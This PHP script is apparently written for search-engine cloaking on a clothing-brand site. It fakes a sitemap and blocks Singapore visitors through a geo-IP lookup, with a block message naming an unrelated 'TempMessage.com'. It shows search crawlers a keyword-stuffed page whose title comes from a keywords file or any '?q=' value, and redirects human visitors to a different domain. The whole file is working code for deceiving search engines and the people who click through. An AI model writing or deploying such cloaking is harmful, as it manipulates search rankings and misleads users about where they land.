<?php
// =========================================================
// ✅ HARD BYPASS FOR SITEMAP (ABSOLUTELY REQUIRED)
// =========================================================
if (
    isset($_SERVER['REQUEST_URI']) &&
    (strpos($_SERVER['REQUEST_URI'], 'sitemap.xml') !== false)
) {
    header("Content-Type: application/xml; charset=UTF-8");

    $urls = [
        "https://best-clothing-brand.onrender.com/",
        "https://best-clothing-brand.onrender.com/about",
        "https://best-clothing-brand.onrender.com/contact",
        "https://best-clothing-brand.onrender.com/shop"
    ];

    $today = date('Y-m-d');

    echo '<?xml version="1.0" encoding="UTF-8"?>' . "\n";
    echo '<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">' . "\n";

    foreach ($urls as $i => $url) {
        $priority = $i === 0 ? "1.0" : "0.8";
        echo "  <url>\n";
        echo "    <loc>{$url}</loc>\n";
        echo "    <lastmod>{$today}</lastmod>\n";
        echo "    <changefreq>weekly</changefreq>\n";
        echo "    <priority>{$priority}</priority>\n";
        echo "  </url>\n";
    }

    echo "</urlset>";
    exit;
}

// =========================================================
// 🚫 Block Singapore traffic (allow Google crawlers / adsbot)
// =========================================================
$userAgent = strtolower($_SERVER['HTTP_USER_AGENT'] ?? '');

if (strpos($userAgent, 'googlebot') === false && strpos($userAgent, 'adsbot-google') === false) {

    function getClientIP() {
        foreach (['HTTP_CLIENT_IP','HTTP_X_FORWARDED_FOR','REMOTE_ADDR'] as $key) {
            if (!empty($_SERVER[$key])) {
                $ipList = explode(',', $_SERVER[$key]);
                return trim($ipList[0]);
            }
        }
        return '0.0.0.0';
    }

    $ip = getClientIP();
    $cacheFile = sys_get_temp_dir() . "/geo_{$ip}.json";

    if (file_exists($cacheFile) && (time() - filemtime($cacheFile)) < 86400) {
        $data = json_decode(file_get_contents($cacheFile), true);
    } else {
        $resp = @file_get_contents("http://ip-api.com/json/{$ip}?fields=status,countryCode");
        $data = $resp ? json_decode($resp, true) : null;
        if ($data) file_put_contents($cacheFile, json_encode($data));
    }

    $country = $data['countryCode'] ?? null;

    if ($country === 'SG') {
        http_response_code(403);
        echo "<h1 style='text-align:center;margin-top:20vh;font-family:sans-serif;color:#444;'>Access Restricted</h1>
        <p style='text-align:center;font-family:sans-serif;'>Sorry, TempMessage.com is not available in your region.</p>";
        exit;
    }
}

// =========================================================
// 🌐 SEO Keyword Logic
// =========================================================
$domain = "https://best-clothing-brand.onrender.com";
$keywordsFile = __DIR__ . '/keywords.txt';

$keywordsList = file_exists($keywordsFile)
    ? file($keywordsFile, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES)
    : [];

if (isset($_GET['q']) && trim($_GET['q']) !== '') {
    $keyword = trim($_GET['q']);
} elseif (!empty($keywordsList)) {
    $daySeed = date('Ymd');
    srand(crc32($daySeed));
    $keyword = $keywordsList[array_rand($keywordsList)];
} else {
    $keyword = 'stylish clothing';
}

$keyword = htmlspecialchars($keyword, ENT_QUOTES, 'UTF-8');
$description = "$keyword We create stylish, comfortable, and affordable clothing for everyday life.";

// =========================================================
// 🤖 Final Bot Detection & Content Output
// =========================================================
$googleBots = ['googlebot', 'adsbot-google', 'bingbot', 'duckduckbot'];
$isBot = false;

foreach ($googleBots as $bot) {
    if (strpos($userAgent, $bot) !== false) {
        $isBot = true;
        break;
    }
}

if ($isBot) {

    header("Content-Type: text/html; charset=UTF-8");

    // ✅ YOUR FULL HTML OUTPUT (UNCHANGED)
    echo <<<HTML
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>$keyword</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta name="description" content="$description">
</head>
<body>
<h1>$keyword</h1>
<p>$description</p>
</body>
</html>
HTML;

} else {
    // ✅ Real humans → Redirect unchanged
    header("Location: https://clothing-brand-eight.vercel.app/");
    exit;
}
?>
